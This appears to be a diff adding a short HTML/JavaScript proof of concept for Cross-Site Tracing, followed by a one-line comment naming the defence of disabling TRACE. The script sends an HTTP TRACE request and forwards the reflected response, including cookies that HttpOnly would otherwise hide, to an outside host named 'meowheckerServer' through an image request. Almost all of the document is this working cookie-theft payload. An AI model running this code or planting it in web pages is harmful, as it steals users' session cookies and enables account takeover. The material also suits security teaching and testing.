@@ -1,0 +1,15 @@
+<script>
+    var xhr = new XMLHttpRequest();
+    //Setting Trace Methods 
+    xhr.open("TRACE", "/", true);
+    // Trigger function 
+    xhr.onload = function() {
+        //Leak cookie to our service | bypass cookie restriction ! 
+        var img = new Image();
+        img.src = "http://meowheckerServer/query?q=" + encodeURIComponent(xhr.responseText);
+    };
+    // Send Request
+    xhr.send(null);
+</script>
+
+<!-- Defends: Disable Trace Methods -->
